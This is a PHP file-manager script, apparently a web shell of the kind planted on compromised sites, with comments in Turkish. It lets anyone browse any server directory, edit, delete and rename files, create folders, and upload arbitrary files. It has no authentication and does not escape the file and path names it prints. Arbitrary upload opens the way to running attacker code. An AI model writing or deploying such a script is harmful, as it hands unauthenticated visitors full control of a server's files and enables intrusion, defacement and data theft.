<?php
session_start();

$currentDir = $_GET['dir'] ?? getcwd();
$currentDir = (is_dir($currentDir) && realpath($currentDir)) ? realpath($currentDir) : getcwd();

function listDirectoryContents($path) {
    $items = array_diff(scandir($path), ['.', '..']);
    echo "<h3>Current Path: $path</h3><ul>";
    foreach ($items as $entry) {
        $fullPath = realpath("$path/$entry");
        if (is_dir($fullPath)) {
            echo "<li><a href='?dir=$fullPath'>$entry</a></li>";
        } else {
            echo "<li>$entry 
                <a href='?dir=$path&action=edit&file=$entry'>Edit</a> | 
                <a href='?dir=$path&action=delete&file=$entry'>Delete</a> | 
                <a href='?dir=$path&action=rename&file=$entry'>Rename</a>
            </li>";
        }
    }
    echo "</ul>";
}

function uploadFile($destinationDir) {
    if (!empty($_FILES['upload']['name'])) {
        $fileDest = $destinationDir . '/' . basename($_FILES['upload']['name']);
        $result = move_uploaded_file($_FILES['upload']['tmp_name'], $fileDest);
        echo $result ? "<p>Upload successful.</p>" : "<p style='color:red;'>Upload failed.</p>";
    }
}

function createNewFolder($destinationDir) {
    $folder = $_POST['new_folder'] ?? '';
    if ($folder) {
        $newPath = $destinationDir . '/' . basename($folder);
        if (!file_exists($newPath)) {
            echo mkdir($newPath, 0777, true) ? "<p>Folder created: $folder</p>" : "<p style='color:red;'>Creation failed.</p>";
        } else {
            echo "<p>Folder already exists.</p>";
        }
    }
}

function createNewFile($destinationDir) {
    $filename = $_POST['new_file'] ?? '';
    if ($filename) {
        $filePath = $destinationDir . '/' . basename($filename);
        if (!file_exists($filePath)) {
            echo file_put_contents($filePath, '') !== false ? "<p>File created: $filename</p>" : "<p style='color:red;'>File creation failed.</p>";
        } else {
            echo "<p>File already exists.</p>";
        }
    }
}

function editFileContent($file) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo "<p>Changes saved.</p>";
    }
    $content = file_exists($file) ? htmlspecialchars(file_get_contents($file)) : '';
    echo "<form method='POST'>
            <textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>
            <button type='submit'>Save</button>
          </form>";
}

function deleteFileFromDisk($file) {
    if (file_exists($file)) {
        echo unlink($file) ? "<p>File deleted successfully.</p>" : "<p style='color:red;'>Could not delete file.</p>";
    } else {
        echo "<p style='color:red;'>File does not exist.</p>";
    }
}

function renameFileInterface($file) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['new_name'])) {
        $newFilePath = dirname($file) . '/' . basename($_POST['new_name']);
        echo rename($file, $newFilePath) ? "<p>File renamed successfully.</p>" : "<p style='color:red;'>Rename failed.</p>";
    } else {
        echo "<form method='POST'>
                <input type='text' name='new_name' placeholder='New name'>
                <button type='submit'>Rename</button>
              </form>";
    }
}

// Görevleri işleme
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['upload'])) uploadFile($currentDir);
    if (isset($_POST['new_folder'])) createNewFolder($currentDir);
    if (isset($_POST['new_file'])) createNewFile($currentDir);
}

if (isset($_GET['action'], $_GET['file'])) {
    $selectedFile = realpath($currentDir . '/' . basename($_GET['file']));
    if ($selectedFile && strpos($selectedFile, $currentDir) === 0) {
        switch ($_GET['action']) {
            case 'edit':
                editFileContent($selectedFile);
                break;
            case 'delete':
                deleteFileFromDisk($selectedFile);
                break;
            case 'rename':
                renameFileInterface($selectedFile);
                break;
            default:
                echo "<p style='color:red;'>Invalid action.</p>";
        }
    } else {
        echo "<p style='color:red;'>Invalid file path.</p>";
    }
}

// Stil ve Arayüz
echo "<style>
    body { background: #f0f0ff; font-family: Arial, sans-serif; text-align: center; }
    form { margin: 20px auto; max-width: 500px; }
    input, button { padding: 10px; margin: 5px; width: 90%; }
</style>";

echo "<a href='?dir=" . dirname($currentDir) . "'>⬅️ Parent Directory</a>";
listDirectoryContents($currentDir);

// Upload formu
echo "<h3>Upload File</h3>
    <form method='POST' enctype='multipart/form-data'>
        <input type='file' name='upload'>
        <button type='submit'>Upload</button>
    </form>";

// Klasör oluşturma formu
echo "<h3>Create New Folder</h3>
    <form method='POST'>
        <input type='text' name='new_folder' placeholder='Folder Name'>
        <button type='submit'>Create</button>
    </form>";

// Dosya oluşturma formu
echo "<h3>Create New File</h3>
    <form method='POST'>
        <input type='text' name='new_file' placeholder='File Name'>
        <button type='submit'>Create</button>
    </form>";
?>
